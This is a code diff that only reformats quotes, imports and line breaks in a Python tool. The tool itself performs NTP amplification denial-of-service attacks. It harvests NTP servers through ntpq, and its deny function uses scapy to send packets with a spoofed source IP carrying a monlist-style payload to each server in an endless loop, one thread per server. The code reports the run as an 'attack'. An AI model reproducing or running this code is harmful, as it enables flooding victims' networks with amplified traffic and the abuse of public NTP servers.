@@ -6,17 +6,17 @@ except ImportError:
     raise ImportError(
         "The 'scapy' library is not installed. Please install it using 'apt-get' before using this package."
     )
-from termcolor import colored
-from pyfiglet import figlet_format
-
-import shutil
 import json
-import socket
-import sys
 import os
-import threading
+import shutil
+import socket
 import subprocess
+import sys
+import threading
 import time
+
+from pyfiglet import figlet_format
+from termcolor import colored
 
 CONFIG_PATH = "config.json"
 
@@ -29,27 +29,27 @@ class Config:
 
     @classmethod
     def from_json_file(cls, json_file):
-        with open(json_file, 'r') as f:
+        with open(json_file, "r") as f:
             json_data = f.read()
         return cls.from_json(json_data)
 
     @classmethod
     def from_json(cls, json_data):
         data = json.loads(json_data)
-        ntp_config_path = data['ntp_config_path']
-        pools = data['pools']
-        server_count = data['server_count']
+        ntp_config_path = data["ntp_config_path"]
+        pools = data["pools"]
+        server_count = data["server_count"]
         config = cls(ntp_config_path, pools, server_count)
         config.removePools()
         config.addPools()
         return config
 
     def removePools(self):
-        with open(self.ntp_config_path, 'r') as config_file:
+        with open(self.ntp_config_path, "r") as config_file:
             lines = config_file.readlines()
-        with open(self.ntp_config_path, 'w') as config_file:
+        with open(self.ntp_config_path, "w") as config_file:
             for line in lines:
-                if not line.startswith('server'):
+                if not line.startswith("server"):
                     config_file.write(line)
 
     def addPools(self):
@@ -69,15 +69,14 @@ class NTPScanner:
 
     def restart_daemon(self):
         print("Restarting ntp daemon...")
-        subprocess.run(['systemctl', 'restart', 'ntp'])
+        subprocess.run(["systemctl", "restart", "ntp"])
         print("Synchronizing ntp servers...")
         time.sleep(2 * self.config.server_count)
 
     def scan(self):
         self.servers.clear()
         print("Scanning for ntp servers...")
-        output = subprocess.run(
-            ["ntpq", "-p"], capture_output=True).stdout.decode()
+        output = subprocess.run(["ntpq", "-p"], capture_output=True).stdout.decode()
         for line in output.split("\n"):
             refid = self.extract_ipv4_refid(line)
             if refid:
@@ -112,15 +111,16 @@ def print_banner():
     font = "standard"
 
     ascii_banner = figlet_format(
-        banner_text, font=font, width=terminal_width, justify="left")
+        banner_text, font=font, width=terminal_width, justify="left"
+    )
 
-    colored_banner = colored(ascii_banner,
-                             color="red", attrs=["bold"])
+    colored_banner = colored(ascii_banner, color="red", attrs=["bold"])
     colored_usage = colored(usage_text, color="red")
     colored_options = colored(options_text, color="red")
     colored_example = colored(example_text, color="red")
     description_text = colored(
-        description_text, color="red", attrs=["bold", "underline"])
+        description_text, color="red", attrs=["bold", "underline"]
+    )
 
     print(colored_banner)
     print(description_text)
@@ -131,8 +131,7 @@ def print_banner():
 
 def deny(server: str, target: str):
     payload = "\x17\x00\x03\x2a" + "\x00" * 4
-    packet = IP(dst=server, src=target) / \
-        UDP(sport=80, dport=123)/Raw(load=payload)
+    packet = IP(dst=server, src=target) / UDP(sport=80, dport=123) / Raw(load=payload)
     send(packet, loop=1, verbose=True)
 
 
@@ -141,17 +140,17 @@ def parse_args():
         print_banner()
         sys.exit(1)
 
-    options = {'-h': "--help", '-s': "--server"}
+    options = {"-h": "--help", "-s": "--server"}
     args = {"target_ip": None, "server_list": None}
 
     i = 1
     while i < len(sys.argv):
         arg = sys.argv[i]
         if arg in options.keys():
-            if arg == '-h':
+            if arg == "-h":
                 print_banner()
                 sys.exit(0)
-            if arg == '-s':
+            if arg == "-s":
                 if i + 1 >= len(sys.argv):
                     print("Error: server list file is required")
                     print_banner()
@@ -173,7 +172,7 @@ def read_servers(server_list: str) -> list:
         print("Error: server list file does not exist")
         sys.exit(1)
 
-    with open(server_list, 'r') as f:
+    with open(server_list, "r") as f:
         servers = f.read().splitlines()
 
     return servers
@@ -186,8 +185,7 @@ def ntp_amplify(servers: list, target: str):
         print("Use CTRL+Z to stop attack")
 
         for server in servers:
-            thread = threading.Thread(
-                target=deny, args=(server, target))
+            thread = threading.Thread(target=deny, args=(server, target))
             thread.daemon = True
             thread.start()
             threads.append(thread)
@@ -220,5 +218,5 @@ def main():
     ntp_amplify(scanner.servers, args["target_ip"])
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
